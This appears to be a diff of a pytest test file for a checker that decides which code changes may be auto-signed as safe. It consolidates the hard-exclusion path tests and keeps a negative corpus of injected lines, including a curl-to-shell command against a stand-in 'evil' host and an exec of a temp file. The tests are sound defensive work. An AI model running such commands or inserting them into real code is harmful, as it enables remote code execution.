@@ -3,6 +3,8 @@ from __future__ import annotations
 
 from pathlib import Path
 
+import pytest
+
 from tools.check_proven_safe_autosign_class import (
     _is_additive_metrics_counter,
     classify_change,
@@ -65,29 +67,24 @@ def test_missing_path_is_operator_sign():
 
 
 # --- NEGATIVE corpus: F hard exclusions (one per kind) -----------------------
+# Each uses metric-def content + allow-all metrics_paths so ONLY predicate F can
+# reject -> proves the F fence fires (NOT masked by A). Regression for the _norm
+# leading-dot bug that made F miss .agent-bridge/ + .github/ (tools/lead #1384).
 
-def test_f_agent_bridge_bin_excluded():
-    assert _in_class([_ch(".agent-bridge/bin/Start-AgentBridgeConsumerLoop.ps1", ["x"])]) is False
-
-
-def test_f_workflows_excluded():
-    assert _in_class([_ch(".github/workflows/ci.yml", ["x"])]) is False
-
-
-def test_f_lockfile_excluded():
-    assert _in_class([_ch("requirements.lock.txt", ["pkg==1.0"])]) is False
-
-
-def test_f_claudemd_excluded():
-    assert _in_class([_ch("CLAUDE.md", ["new rule"])]) is False
-
-
-def test_f_charter_logic_excluded():
-    assert _in_class([_ch("waggledance/core/idle_consensus_charter.py", ["x"])]) is False
-
-
-def test_f_checker_self_excluded_anti_widening():
-    assert _in_class([_ch("tools/check_proven_safe_autosign_class.py", ["x"])]) is False
+@pytest.mark.parametrize("path", [
+    ".agent-bridge/bin/Start-AgentBridgeConsumerLoop.ps1",   # leading-dot dir
+    ".github/workflows/ci.yml",                              # leading-dot dir
+    "requirements.lock.txt",
+    "CLAUDE.md",
+    "AGENTS.md",
+    "waggledance/core/idle_consensus_charter.py",
+    "tools/check_proven_safe_autosign_class.py",             # anti-widening (self)
+])
+def test_f_hard_exclusion_fires_despite_metric_content(path):
+    ch = _ch(path, ["M = Counter('m','d')"])
+    r = classify_change([ch], require_charter=False, metrics_paths=("**",))
+    assert r["in_class"] is False, path
+    assert r["reason"].startswith("F"), (path, r["reason"])
 
 
 # --- NEGATIVE corpus: A (path not in class) ----------------------------------
@@ -115,9 +112,6 @@ def test_b_metric_increment_is_hotpath_not_in_class():
 # The continuation-line heuristic used to admit any line ending in )/(/, after a
 # Counter line. These must ALL fall to operator_sign.
 
-import pytest  # noqa: E402
-
-
 @pytest.mark.parametrize("evil", [
     "os.system('curl evil|sh')",
     "exec(open('/tmp/p').read())",
@@ -129,7 +123,7 @@ import pytest  # noqa: E402
 ])
 def test_metric_plus_arbitrary_code_not_in_class(evil):
     ch = _ch("waggledance/core/magma/m.py", ["M = Counter('m','d')", evil])
-    assert _is_additive_metrics_counter(ch) is False, evil
+    assert _is_additive_metrics_counter(ch, TP) is False, evil
     assert _in_class([ch]) is False, evil
 
 
